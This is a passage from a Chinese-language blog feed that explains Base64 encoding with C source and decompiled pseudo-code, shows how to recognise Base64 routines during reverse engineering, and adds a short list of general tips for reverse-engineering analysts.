class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">char</span> *<span class="title">base64_encode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> * bindata, <span class="keyword">char</span> * base64, <span class="keyword">int</span> binlength )</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> current;</div><div class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>, j = <span class="number">0</span> ; i &lt; binlength ; i += <span class="number">3</span> )</div><div class="line">    &#123;</div><div class="line">        current = (bindata[i] &gt;&gt; <span class="number">2</span>) ;</div><div class="line">        current &amp;= (<span class="keyword">unsigned</span> <span class="keyword">char</span>)<span class="number">0x3F</span>;</div><div class="line">        base64[j++] = base64char[(<span class="keyword">int</span>)current];</div><div class="line">        current = ( (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(bindata[i] &lt;&lt; <span class="number">4</span> ) ) &amp; ( (<span class="keyword">unsigned</span> <span class="keyword">char</span>)<span class="number">0x30</span> ) ;   <span class="comment">//特征：左移4位</span></div><div class="line">        <span class="keyword">if</span> ( i + <span class="number">1</span> &gt;= binlength )</div><div class="line">        &#123;</div><div class="line">            base64[j++] = base64char[(<span class="keyword">int</span>)current];</div><div class="line">            base64[j++] = <span class="string">'='</span>;</div><div class="line">            base64[j++] = <span class="string">'='</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">        current |= ( (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(bindata[i+<span class="number">1</span>] &gt;&gt; <span class="number">4</span>) ) &amp; ( (<span class="keyword">unsigned</span> <span class="keyword">char</span>) <span class="number">0x0F</span> );  <span class="comment">//特征：右移4位</span></div><div class="line">        base64[j++] = base64char[(<span class="keyword">int</span>)current];</div><div class="line">        current = ( (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(bindata[i+<span class="number">1</span>] &lt;&lt; <span class="number">2</span>) ) &amp; ( (<span class="keyword">unsigned</span> <span class="keyword">char</span>) <span class="number">0x3C</span> ) ;   <span class="comment">//特征：左移2位</span></div><div class="line">        <span class="keyword">if</span> ( i + <span class="number">2</span> &gt;= binlength )</div><div class="line">        &#123;</div><div class="line">            base64[j++] = base64char[(<span class="keyword">int</span>)current];</div><div class="line">            base64[j++] = <span class="string">'='</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">        current |= ( (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(bindata[i+<span class="number">2</span>] &gt;&gt; <span class="number">6</span>) ) &amp; ( (<span class="keyword">unsigned</span> <span class="keyword">char</span>) <span class="number">0x03</span> );    <span class="comment">//特征：左移6位</span></div><div class="line">        base64[j++] = base64char[(<span class="keyword">int</span>)current];</div><div class="line">        current = ( (<span class="keyword">unsigned</span> <span class="keyword">char</span>)bindata[i+<span class="number">2</span>] ) &amp; ( (<span class="keyword">unsigned</span> <span class="keyword">char</span>)<span class="number">0x3F</span> ) ;</div><div class="line">        base64[j++] = base64char[(<span class="keyword">int</span>)current];</div><div class="line">    &#125;</div><div class="line">    base64[j] = <span class="string">'\0'</span>;</div><div class="line">    <span class="keyword">return</span> base64;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h1 id="Base64的识别："><a href="#Base64的识别：" class="headerlink" title="Base64的识别："></a>Base64的识别：</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#DC143C"><strong>根据加密算法，他的特征是出现左/右移2位，4位，6位.</strong></font><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在逆向中，我们逆向一个Base64的加密函数如下：<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">int</span> __cdecl <span class="keyword">sub_434990(int </span><span class="built_in">a1</span>, unsigned int <span class="built_in">a2</span>, int <span class="built_in">a3</span>)</div><div class="line">&#123;</div><div class="line">  int <span class="built_in">v3</span><span class="comment">; // eax@5</span></div><div class="line">  unsigned int <span class="built_in">v5</span><span class="comment">; // [sp+Ch] [bp-100h]@1</span></div><div class="line">  unsigned int <span class="built_in">v6</span><span class="comment">; // [sp+D4h] [bp-38h]@4</span></div><div class="line">  unsigned int <span class="built_in">v7</span><span class="comment">; // [sp+E0h] [bp-2Ch]@8</span></div><div class="line">  int <span class="built_in">v8</span><span class="comment">; // [sp+ECh] [bp-20h]@1</span></div><div class="line">  int v9<span class="comment">; // [sp+F8h] [bp-14h]@1</span></div><div class="line">  unsigned int i<span class="comment">; // [sp+104h] [bp-8h]@1</span></div><div class="line">  memset(&amp;<span class="built_in">v5</span>, <span class="number">0xCC</span>u, <span class="number">0x100</span>u)<span class="comment">;</span></div><div class="line">  <span class="built_in">v8</span> = <span class="number">0</span><span class="comment">;</span></div><div class="line">  v9 = <span class="number">0</span><span class="comment">;</span></div><div class="line">  for ( i = <span class="number">0</span><span class="comment">; i &lt; a2; ++i )</span></div><div class="line">  &#123;</div><div class="line">    <span class="built_in">v6</span> = i % <span class="number">4</span><span class="comment">;</span></div><div class="line">    <span class="meta">if</span> ( *(_BYTE *)(i + <span class="built_in">a1</span>) == <span class="number">61</span> )</div><div class="line">    &#123;</div><div class="line">      <span class="built_in">v3</span> = <span class="number">0</span><span class="comment">;</span></div><div class="line">      return fun_ResultIsV2(<span class="number">1</span>, <span class="built_in">v3</span>)<span class="comment">;</span></div><div class="line">    &#125;</div><div class="line">    <span class="meta">if</span> ( (signed int)*(_BYTE *)(i + <span class="built_in">a1</span>) &lt; <span class="number">43</span></div><div class="line">      <span class="title">||</span> (signed int)*(_BYTE *)(i + <span class="built_in">a1</span>) &gt; <span class="number">122</span></div><div class="line">      <span class="title">||</span> (<span class="built_in">v7</span> = <span class="keyword">byte_48B0FD[*(_BYTE </span>*)(i + <span class="built_in">a1</span>)], <span class="built_in">v7</span> == -<span class="number">1</span>) )</div><div class="line">    &#123;</div><div class="line">      <span class="built_in">v3</span> = <span class="number">1</span><span class="comment">;</span></div><div class="line">      return fun_ResultIsV2(<span class="number">1</span>, <span class="built_in">v3</span>)<span class="comment">;</span></div><div class="line">    &#125;</div><div class="line">    <span class="built_in">v5</span> = <span class="built_in">v6</span><span class="comment">;</span></div><div class="line">    <span class="keyword">switch </span>( <span class="built_in">v6</span> )</div><div class="line">    &#123;</div><div class="line">      case <span class="number">0</span>u:</div><div class="line">        *(_BYTE *)(v9 + <span class="built_in">a3</span>) = <span class="number">4</span> * <span class="built_in">v7</span><span class="comment">;</span></div><div class="line">        <span class="built_in">v8</span> = <span class="number">0</span><span class="comment">;</span></div><div class="line">        <span class="built_in">v8</span> = <span class="keyword">sub_42D681();</span></div><div class="line"><span class="keyword"> </span>       <span class="meta">if</span> ( <span class="built_in">v8</span> == <span class="number">1</span> )</div><div class="line">          <span class="keyword">sub_42E086();</span></div><div class="line"><span class="keyword"> </span>       <span class="built_in">v8</span> = <span class="number">0</span><span class="comment">;</span></div><div class="line">        <span class="built_in">v8</span> = <span class="keyword">sub_42E26B();</span></div><div class="line"><span class="keyword"> </span>       <span class="meta">if</span> ( <span class="built_in">v8</span> == <span class="number">1</span> )</div><div class="line">          <span class="keyword">sub_42E086();</span></div><div class="line"><span class="keyword"> </span>       <span class="built_in">v8</span> = <span class="number">0</span><span class="comment">;</span></div><div class="line">        <span class="built_in">v8</span> = <span class="keyword">sub_42D7F8();</span></div><div class="line"><span class="keyword"> </span>       <span class="meta">if</span> ( <span class="built_in">v8</span> == <span class="number">1</span> )</div><div class="line">          <span class="keyword">sub_42E086();</span></div><div class="line"><span class="keyword"> </span>       <span class="keyword">break;</span></div><div class="line"><span class="keyword"> </span>     case <span class="number">1</span>u:</div><div class="line">        *(_BYTE *)(v9++ + <span class="built_in">a3</span>) += (<span class="built_in">v7</span> &gt;&gt; <span class="number">4</span>) &amp; <span class="number">3</span><span class="comment">;</span></div><div class="line">        <span class="meta">if</span> ( i &lt; <span class="built_in">a2</span> - <span class="number">3</span> <span class="title">||</span> *(_BYTE *)(<span class="built_in">a2</span> + <span class="built_in">a1</span> - <span class="number">2</span>) != <span class="number">61</span> )</div><div class="line">          *(_BYTE *)(v9 + <span class="built_in">a3</span>) = <span class="number">16</span> * (<span class="built_in">v7</span> &amp; <span class="number">0xF</span>)<span class="comment">;</span></div><div class="line">        <span class="keyword">break;</span></div><div class="line"><span class="keyword"> </span>     case <span class="number">2</span>u:</div><div class="line">        *(_BYTE *)(v9++ + <span class="built_in">a3</span>) += (<span class="built_in">v7</span> &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0xF</span><span class="comment">;</span></div><div class="line">        <span class="built_in">v8</span> = <span class="keyword">sub_42E26B();</span></div><div class="line"><span class="keyword"> </span>       <span class="meta">if</span> ( <span class="built_in">v8</span> == <span class="number">1</span> )</div><div class="line">          <span class="keyword">sub_42E086();</span></div><div class="line"><span class="keyword"> </span>       <span class="built_in">v8</span> = <span class="number">0</span><span class="comment">;</span></div><div class="line">        <span class="built_in">v8</span> = <span class="keyword">sub_42D7F8();</span></div><div class="line"><span class="keyword"> </span>       <span class="meta">if</span> ( <span class="built_in">v8</span> == <span class="number">1</span> )</div><div class="line">          <span class="keyword">sub_42E086();</span></div><div class="line"><span class="keyword"> </span>       <span class="meta">if</span> ( i &lt; <span class="built_in">a2</span> - <span class="number">2</span> <span class="title">||</span> *(_BYTE *)(<span class="built_in">a2</span> + <span class="built_in">a1</span> - <span class="number">1</span>) != <span class="number">61</span> )</div><div class="line">          *(_BYTE *)(v9 + <span class="built_in">a3</span>) = (<span class="built_in">v7</span> &amp; <span class="number">3</span>) &lt;&lt; <span class="number">6</span><span class="comment">;</span></div><div class="line">        <span class="keyword">break;</span></div><div class="line"><span class="keyword"> </span>     case <span class="number">3</span>u:</div><div class="line">        *(_BYTE *)(v9++ + <span class="built_in">a3</span>) += <span class="built_in">v7</span><span class="comment">;</span></div><div class="line">        <span class="keyword">break;</span></div><div class="line"><span class="keyword"> </span>     default:</div><div class="line">        continue<span class="comment">;</span></div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="built_in">v3</span> = <span class="number">0</span><span class="comment">;</span></div><div class="line">  return fun_ResultIsV2(<span class="number">1</span>, <span class="built_in">v3</span>)<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关键部分如下图所示：<br>    <img src="https://i.imgur.com/UKAgFfp.png" alt=""><br>    <img src="https://i.imgur.com/cqSI9u4.png" alt=""><br>    <img src="https://i.imgur.com/KHIWLiQ.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;总括：&quot;&gt;&lt;a href=&quot;#总括：&quot; class=&quot;headerlink&quot; title=&quot;总括：&quot;&gt;&lt;/a&gt;总括：&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;strong&gt;本篇文章主要介绍关于Base64的加密原理，加密函数，及其应用。&lt;/strong&gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;strong&gt;Base64编码，是我们程序开发中经常使用到的编码方法。它是一种基于用64个可打印字符来表示二进制数据的表示方法。它其实只是定义用可打印字符传输内容一种方法，并不会产生新的字符集。&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="密码学" scheme="http://yoursite.com/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
  </entry>
  
  <entry>
    <title>给逆向工作者的忠告</title>
    <link href="http://yoursite.com/2017/12/09/%E7%BB%99%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E4%BA%BA%E5%91%98%E7%9A%84%E5%BF%A0%E5%91%8A/"/>
    <id>http://yoursite.com/2017/12/09/给逆向分析人员的忠告/</id>
    <published>2017-12-09T09:02:11.000Z</published>
    <updated>2017-12-09T09:50:30.586Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-首先使用行为分析工具，对需要逆向的程序进行行为分析，这个能把握程序的总体运行特征。"><a href="#1-首先使用行为分析工具，对需要逆向的程序进行行为分析，这个能把握程序的总体运行特征。" class="headerlink" title="1.首先使用行为分析工具，对需要逆向的程序进行行为分析，这个能把握程序的总体运行特征。"></a>1.首先使用行为分析工具，对需要逆向的程序进行行为分析，这个能把握程序的总体运行特征。</h1><h1 id="2-使用静态和动态结合的分析思路。"><a href="#2-使用静态和动态结合的分析思路。" class="headerlink" title="2.使用静态和动态结合的分析思路。"></a>2.使用静态和动态结合的分析思路。</h1><h1 id="3-不要完全依赖于反编译器，因为程序很可能采用反调试和混淆技术，干扰其判断。"><a href="#3-不要完全依赖于反编译器，因为程序很可能采用反调试和混淆技术，干扰其判断。" class="headerlink" title="3.不要完全依赖于反编译器，因为程序很可能采用反调试和混淆技术，干扰其判断。"></a>3.不要完全依赖于反编译器，因为程序很可能采用反调试和混淆技术，干扰其判断。</h1><h1 id="4-合理使用F5大法，因为他会把一个简单的问题复杂化，简单点。"><a href="#4-合理使用F5大法，因为他会把一个简单的问题复杂化，简单点。" class="headerlink" title="4.合理使用F5大法，因为他会把一个简单的问题复杂化，简单点。"></a>4.合理使用F5大法，因为他会把一个简单的问题复杂化，简单点。</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2017年12月9日</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1-首先使用行为分析工具，对需要逆向的程序进行行为分析，这个能把握程序的总体运行特征。&quot;&gt;&lt;a href=&quot;#1-首先使用行为分析工具，对需要逆向的程序进行行为分析，这个能把握程序的总体运行特征。&quot; class=&quot;headerlink&quot; title=&quot;1.首先使用
      
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
</feed>
